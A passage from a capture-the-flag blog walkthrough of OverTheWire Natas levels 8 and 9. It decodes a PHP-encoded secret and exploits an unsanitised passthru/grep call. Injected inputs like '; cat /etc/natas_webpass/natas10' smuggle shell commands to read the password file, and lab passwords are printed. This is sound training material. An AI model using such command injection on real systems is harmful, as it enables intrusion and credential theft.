+<pre class="chroma"><code class="language-php" data-lang="php">$encodedSecret = &#34;3d3d516343746d4d6d6c315669563362&#34;;
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>Just need to reverse the order of operations here and then the <code>secret</code> should be revealed.</p>
+<p>Two different ways to approach this, could write up some php and then run it, or just use some online tools to execute php functions.</p>
+<p>First: <code>hex2bin</code>, followed by <code>strrev</code>, and then a <code>base64_decode</code>. That gives a secret, <code>oubWYf2kBq</code>.</p>
+<p>And now for the password for the next challenge:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">Access granted. The password <span class="k">for</span> natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="natas9">natas9</h3>
+<p>Starting this off by going to: <a href="http://natas9.natas.labs.overthewire.org/">http://natas9.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas9
+Pass: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking at the source:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas9&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;&lt;censored&gt;&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas9<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+Find words containing: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">needle</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">Search</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+
+Output:
+<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="cp">&lt;?
+</span><span class="cp">$key = &#34;&#34;;
+</span><span class="cp">
+</span><span class="cp">if(array_key_exists(&#34;needle&#34;, $_REQUEST)) {
+</span><span class="cp">    $key = $_REQUEST[&#34;needle&#34;];
+</span><span class="cp">}
+</span><span class="cp">
+</span><span class="cp">if($key != &#34;&#34;) {
+</span><span class="cp">    passthru(&#34;grep -i $key dictionary.txt&#34;);
+</span><span class="cp">}
+</span><span class="cp">?&gt;</span>
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looks like the interesting bit of code is here:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">if($key != &#34;&#34;) {
+    passthru(&#34;grep -i $key dictionary.txt&#34;);
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>Doesn&rsquo;t seems there&rsquo;s any <a href="https://en.wikipedia.org/wiki/Code_injection#Preventing_problems" target="_blank" rel="noopener noreffer">sanitizing</a> of the input strings. It may be possible to have it execute arbitrary commands.</p>
+<p>Trying with <code>;ls -al</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">Output</span><span class="o">:</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="m">1</span> <span class="n">natas9</span> <span class="n">natas9</span> <span class="m">460878</span> <span class="n">Dec</span> <span class="m">15</span>  <span class="m">2016</span> <span class="n">dictionary.txt</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looks like this can be exploited to execute any sort of command we&rsquo;d like on the webserver. Time to find the password.</p>
+<p>Using what we knew about the paths for the password for the previous challenge, it should be possible to explore the contents of <code>/etc</code> with: <code>; ls -al /etc/</code>. Sure enough there&rsquo;s a <code>natas_webpass/</code>. To get the password, just use <code>; cat /etc/natas_webpass/natas10</code> and move on to the net challenge:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-06-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://example.com/natas_challenges_part1/" data-title="Natas Challenges (part 1)" data-hashtags="OTW,natas,wargames"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://example.com/natas_challenges_part1/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/natas/">natas</a>,&nbsp;<a href="/tags/wargames/">wargames</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"Hey, this site uses cookies."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"}};</script><script type="text/javascript" src="/js/theme.min.69ac882c686e101963f9cd3dc6167cee800004e4e9f40dae6f6fbeb3b03fb81ead782f98cc6e6eeec42b70a1b7047c7902e8f0ba3171660e2c2dc59d62965c7a.js" integrity="sha512-aayILGhuEBlj&#43;c09xhZ87oAABOTp9A2ub2&#43;&#43;s7A/uB6teC&#43;YzG5u7sQrcKG3BHx5AujwujFxZg4sLcWdYpZceg=="></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'UA-168052344-1');
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=UA-168052344-1" async></script></body>
+</html>
